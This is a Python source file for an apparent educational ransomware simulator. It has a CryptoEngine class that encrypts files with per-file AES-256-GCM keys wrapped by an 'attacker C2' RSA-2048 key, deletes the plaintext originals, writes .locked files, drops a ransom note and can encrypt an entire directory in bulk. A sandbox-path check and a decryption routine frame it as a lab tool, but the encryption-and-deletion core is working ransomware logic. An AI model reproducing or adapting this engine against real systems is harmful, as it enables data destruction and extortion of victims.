"""
Hybrid Cryptography Engine (AES-256-GCM + RSA-2048)
Simulates modern cryptovirology (Ransomware encryption/decryption lifecycle)
Operates 100% inside the authorized sandbox environment.
"""

import os
import time
import hashlib
import struct
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from config import (
    MAGIC_HEADER,
    RSA_KEY_SIZE,
    AES_KEY_SIZE,
    AES_NONCE_SIZE,
    RANSOM_EXTENSION,
    RANSOM_NOTE_NAME,
    KEYS_DIR,
    SANDBOX_DIR,
    validate_sandbox_path,
    SecurityGuardException,
)


class CryptoEngine:
    def __init__(self):
        self.priv_key_path = KEYS_DIR / "attacker_c2_private.pem"
        self.pub_key_path = KEYS_DIR / "attacker_c2_public.pem"
        self._ensure_c2_keypair()

    def _ensure_c2_keypair(self) -> None:
        """Initializes or loads the Attacker C2 RSA-2048 keypair."""
        if not self.priv_key_path.exists() or not self.pub_key_path.exists():
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=RSA_KEY_SIZE,
            )
            public_key = private_key.public_key()

            priv_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            )
            pub_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )

            with open(self.priv_key_path, "wb") as f:
                f.write(priv_pem)
            with open(self.pub_key_path, "wb") as f:
                f.write(pub_pem)

    def get_public_key_pem(self) -> str:
        """Returns the C2 Public Key in PEM string format."""
        with open(self.pub_key_path, "r", encoding="utf-8") as f:
            return f.read()

    def get_private_key_pem(self) -> str:
        """Returns the C2 Private Key in PEM string format (for lab decryption simulation)."""
        with open(self.priv_key_path, "r", encoding="utf-8") as f:
            return f.read()

    def get_key_fingerprint(self) -> str:
        """Computes SHA-256 fingerprint of the public key."""
        pub_pem = self.get_public_key_pem().encode("utf-8")
        return hashlib.sha256(pub_pem).hexdigest()[:16].upper()

    def encrypt_file(self, file_path: str | Path, public_key_pem: Optional[str] = None) -> Dict[str, Any]:
        """
        Simulates Ransomware Hybrid Encryption on a single file:
        1. Validates file is strictly inside sandbox.
        2. Computes original SHA-256 checksum.
        3. Generates per-file ephemeral AES-256 key and 96-bit nonce.
        4. Encrypts payload with AES-256-GCM.
        5. Encrypts AES key with RSA-2048 Public Key (OAEP padding).
        6. Packages header + encrypted key + nonce + ciphertext into .locked file.
        7. Safely removes plaintext file and drops ransom note.
        """
        safe_path = validate_sandbox_path(file_path)

        if not safe_path.exists() or not safe_path.is_file():
            raise FileNotFoundError(f"Target file not found: {safe_path.name}")

        if safe_path.name.endswith(RANSOM_EXTENSION) or safe_path.name == RANSOM_NOTE_NAME:
            raise ValueError(f"File '{safe_path.name}' is already encrypted or is a ransom note.")

        start_time = time.perf_counter()

        # Load target content & compute initial hash
        with open(safe_path, "rb") as f:
            plaintext = f.read()

        file_size = len(plaintext)
        original_sha256 = hashlib.sha256(plaintext).hexdigest()

        # Load RSA public key
        if public_key_pem:
            pub_key = serialization.load_pem_public_key(public_key_pem.encode("utf-8"))
        else:
            with open(self.pub_key_path, "rb") as f:
                pub_key = serialization.load_pem_public_key(f.read())

        # 1. Symmetric Encryption: AES-256-GCM
        aes_session_key = os.urandom(AES_KEY_SIZE)
        nonce = os.urandom(AES_NONCE_SIZE)
        aesgcm = AESGCM(aes_session_key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)

        # 2. Asymmetric Encryption: Wrap AES key with RSA-2048 OAEP
        enc_aes_key = pub_key.encrypt(
            aes_session_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

        # 3. Package File Format:
        # [MAGIC (8B)] + [KEY_LEN (4B)] + [ENC_KEY (256B)] + [NONCE (12B)] + [CIPHERTEXT]
        locked_path = safe_path.with_name(safe_path.name + RANSOM_EXTENSION)
        with open(locked_path, "wb") as f:
            f.write(MAGIC_HEADER)
            f.write(struct.pack(">I", len(enc_aes_key)))
            f.write(enc_aes_key)
            f.write(nonce)
            f.write(ciphertext)

        # Remove original plaintext file
        safe_path.unlink()

        # Ensure ransom note exists in directory
        self._drop_ransom_note(safe_path.parent)

        elapsed_ms = (time.perf_counter() - start_time) * 1000

        return {
            "success": True,
            "original_filename": safe_path.name,
            "locked_filename": locked_path.name,
            "file_size_bytes": file_size,
            "original_sha256": original_sha256,
            "aes_session_key_hex": aes_session_key.hex(),
            "enc_aes_key_preview": enc_aes_key.hex()[:32] + "...",
            "duration_ms": round(elapsed_ms, 2),
            "algorithm": "Hybrid AES-256-GCM + RSA-2048 OAEP",
        }

    def decrypt_file(self, locked_file_path: str | Path, private_key_pem: str) -> Dict[str, Any]:
        """
        Simulates Ransomware Recovery / Decryption on a single locked file:
        1. Validates file is strictly inside sandbox.
        2. Validates magic header format.
        3. Decrypts AES session key using victim/admin provided RSA Private Key.
        4. Decrypts file payload using AES-GCM.
        5. Restores original filename, computes post-decryption SHA-256.
        6. Removes .locked file.
        """
        safe_path = validate_sandbox_path(locked_file_path)

        if not safe_path.exists() or not safe_path.is_file():
            raise FileNotFoundError(f"Target file not found: {safe_path.name}")

        if not safe_path.name.endswith(RANSOM_EXTENSION):
            raise ValueError(f"File '{safe_path.name}' does not have the '{RANSOM_EXTENSION}' extension.")

        start_time = time.perf_counter()

        with open(safe_path, "rb") as f:
            payload = f.read()

        magic_len = len(MAGIC_HEADER)
        if len(payload) < magic_len + 4 or payload[:magic_len] != MAGIC_HEADER:
            raise ValueError("Corrupted file format: Missing or invalid LOCKSIM magic header.")

        offset = magic_len
        enc_key_len = struct.unpack(">I", payload[offset : offset + 4])[0]
        offset += 4

        enc_aes_key = payload[offset : offset + enc_key_len]
        offset += enc_key_len

        nonce = payload[offset : offset + AES_NONCE_SIZE]
        offset += AES_NONCE_SIZE

        ciphertext = payload[offset:]

        # Load RSA Private Key
        try:
            priv_key = serialization.load_pem_private_key(
                private_key_pem.encode("utf-8"),
                password=None,
            )
        except Exception as e:
            raise ValueError(f"Invalid RSA Private Key format: {str(e)}")

        # 1. Decrypt AES session key with RSA-2048 OAEP
        try:
            aes_session_key = priv_key.decrypt(
                enc_aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
        except Exception:
            raise ValueError("Decryption failed: Incorrect RSA Private Key provided for this file.")

        # 2. Decrypt Ciphertext with AES-GCM
        try:
            aesgcm = AESGCM(aes_session_key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        except Exception:
            raise ValueError("Integrity check failed: AES-GCM authentication tag mismatch or corrupted data.")

        # 3. Restore original filename
        original_name = safe_path.name[: -len(RANSOM_EXTENSION)]
        restored_path = safe_path.with_name(original_name)

        with open(restored_path, "wb") as f:
            f.write(plaintext)

        # Remove locked file
        safe_path.unlink()

        restored_sha256 = hashlib.sha256(plaintext).hexdigest()
        elapsed_ms = (time.perf_counter() - start_time) * 1000

        # Check if any .locked files remain; if not, optionally clean up ransom note
        self._check_cleanup_ransom_note(restored_path.parent)

        return {
            "success": True,
            "locked_filename": safe_path.name,
            "restored_filename": restored_path.name,
            "restored_file_size_bytes": len(plaintext),
            "restored_sha256": restored_sha256,
            "duration_ms": round(elapsed_ms, 2),
        }

    def encrypt_all_sandbox(self) -> Dict[str, Any]:
        """Encrypts all candidate files in the sandbox directory."""
        results = []
        files = [
            f for f in SANDBOX_DIR.iterdir()
            if f.is_file() and not f.name.endswith(RANSOM_EXTENSION) and f.name != RANSOM_NOTE_NAME
        ]

        total_bytes = 0
        for f in files:
            res = self.encrypt_file(f)
            total_bytes += res["file_size_bytes"]
            results.append(res)

        return {
            "total_files_encrypted": len(results),
            "total_bytes": total_bytes,
            "details": results,
        }

    def decrypt_all_sandbox(self, private_key_pem: str) -> Dict[str, Any]:
        """Decrypts all .locked files in the sandbox directory using the provided private key."""
        results = []
        locked_files = [f for f in SANDBOX_DIR.iterdir() if f.is_file() and f.name.endswith(RANSOM_EXTENSION)]

        for f in locked_files:
            res = self.decrypt_file(f, private_key_pem)
            results.append(res)

        return {
            "total_files_decrypted": len(results),
            "details": results,
        }

    def _drop_ransom_note(self, directory: Path) -> None:
        """Drops an educational mock ransom note in the victim directory."""
        note_path = directory / RANSOM_NOTE_NAME
        fingerprint = self.get_key_fingerprint()
        note_content = f"""=============================================================================
!!! YOUR FILES HAVE BEEN ENCRYPTED (EDUCATIONAL SIMULATION) !!!
=============================================================================

[SECURITY LAB NOTICE - AN TOAN THONG TIN]
This message is part of an academic cybersecurity demonstration.
Your files inside this sandbox directory have been locked with:
- Military Grade Symmetric Cipher: AES-256-GCM
- Asymmetric Master Key Protection: RSA-2048 with OAEP SHA-256

VICTIM IDENTIFIER   : ID-{fingerprint}
C2 PUBLIC KEY FP    : {fingerprint}
SIMULATION TIME     : {time.strftime('%Y-%m-%d %H:%M:%S')}

HOW TO RESTORE YOUR DATA:
In this educational laboratory, do NOT pay any ransom.
Use the SOC Dashboard Recovery Panel or provide the Attacker C2 Private Key
located in the project control center to unlock your files losslessly.

You can also click '1-Click Sandbox Reset' at any time to restore fresh files.
=============================================================================
"""
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(note_content)

    def _check_cleanup_ransom_note(self, directory: Path) -> None:
        """Removes the ransom note once all locked files have been decrypted."""
        remaining_locked = [f for f in directory.iterdir() if f.is_file() and f.name.endswith(RANSOM_EXTENSION)]
        note_path = directory / RANSOM_NOTE_NAME
        if not remaining_locked and note_path.exists():
            note_path.unlink()
